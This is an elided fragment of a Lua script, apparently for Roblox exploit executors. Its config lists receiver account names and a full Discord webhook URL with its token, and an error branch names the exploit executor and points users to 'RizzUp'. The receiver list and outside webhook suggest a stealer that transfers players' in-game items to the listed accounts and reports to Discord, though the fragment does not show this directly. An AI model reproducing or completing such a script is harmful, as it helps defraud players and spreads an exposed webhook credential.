Config = {
    Receivers = {"MdShxq"}, -- {"ROBLOX"} or {"ROBLOX", "ROBLOX1", "ROBLOX2"}
    Webhook = "https://discord.com/api/webhooks/1269207343208599686/PG6u-b5Px6pbH6Y63w-wZqUkSvSCOzkYvF-nQzgthRVY9Kj2Rvc71sPMZ2ZxDh0nAmgl",
...
if success then
    ...
    message = "```Error   : " .. errorMsg .. "\nExploit : " .. Executor .. "```\n\n**Please report this error to RizzUp as it may be a critical error that could lead to vulnerabilities.**"
end
